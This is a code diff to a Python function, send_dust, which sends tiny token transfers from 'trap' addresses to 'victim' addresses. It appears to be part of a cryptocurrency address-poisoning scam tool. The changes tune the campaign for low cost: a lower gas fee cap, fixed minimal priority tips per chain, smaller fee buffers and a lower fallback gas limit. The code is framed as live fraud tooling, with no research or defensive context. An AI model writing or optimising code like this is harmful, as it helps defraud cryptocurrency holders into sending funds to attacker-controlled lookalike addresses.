@@ -398,7 +398,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
             _local_nonces[trap] = max(_local_nonces[trap], rpc_nonce)
         nonce = _local_nonces[trap]
 
-             # --- DYNAMIC GAS & EIP-1559 / LEGACY PRICING (Matched to batch_fund.py) ---
+             # --- OPTIMIZED / LOW-FEE DYNAMIC GAS PRICING ---
         latest_block = call_with_retry(w3.eth.get_block, "latest")
         
         use_eip1559 = (
@@ -408,26 +408,28 @@ def send_dust(private_key, victim_address, campaign_id=None):
         )
 
         gas_params = {}
-        # Match batch_fund.py's safer 100 Gwei cap default
-        max_fee_cap = w3.to_wei(getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 100), "gwei")
+        # Lower default max fee cap to prevent executing during network spikes
+        max_fee_cap = w3.to_wei(getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 25), "gwei")
         
-        # First attempt, so gas_bump is 1.0
         gas_bump = 1.0
 
         if use_eip1559:
             base_fee = latest_block["baseFeePerGas"]
             
-            try:
-                max_priority = w3.eth.max_priority_fee
-            except Exception:
-                max_priority = w3.to_wei(0.05, "gwei")
+            # --- LOW GAS OPTIMIZATION ---
+            # 1. Cap priority fee to low fixed value based on chain
+            if CHAIN.lower() == "polygon":
+                max_priority = w3.to_wei(30, "gwei")  # Polygon network minimum
+            elif CHAIN.lower() == "ethereum":
+                max_priority = w3.to_wei(0.05, "gwei") # Low priority tip (0.05 Gwei vs standard 1+ Gwei)
+            else:
+                max_priority = w3.to_wei(0.01, "gwei")
 
-            max_priority = int(max_priority * gas_bump)
-            buffer = 1.1 * gas_bump  # 10% buffer, matching batch_fund.py exactly
+            # 2. Reduced Base Fee buffer from 10% (1.1) to 2% (1.02)
+            buffer = 1.02 * gas_bump  
             max_fee = int((base_fee * buffer) + max_priority)
             max_fee = min(max_fee, max_fee_cap)
 
-            # Invariant: maxFeePerGas >= maxPriorityFeePerGas
             if max_fee < max_priority:
                 max_fee = max_priority
 
@@ -436,7 +438,8 @@ def send_dust(private_key, victim_address, campaign_id=None):
             effective_gas_price = max_fee
         else:
             gas_price = w3.eth.gas_price
-            legacy_buffer = 1.05 * gas_bump  # 5% buffer for legacy chains
+            # Reduced legacy buffer from 5% (1.05) to 1% (1.01)
+            legacy_buffer = 1.01 * gas_bump
             capped_gas_price = min(int(gas_price * legacy_buffer), max_fee_cap)
             gas_params['gasPrice'] = capped_gas_price
             effective_gas_price = capped_gas_price
@@ -475,10 +478,10 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
             try:
                 estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
-                gas_limit = int(estimated * 1.05)
+                gas_limit = int(estimated * 1.01)
             except Exception as e:
-                logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
-                gas_limit = 68000
+                logger.warning(f"Gas estimation failed: {e}, using fallback 50000")
+                gas_limit = 50000
 
             tx_payload = {
                 "from": trap,
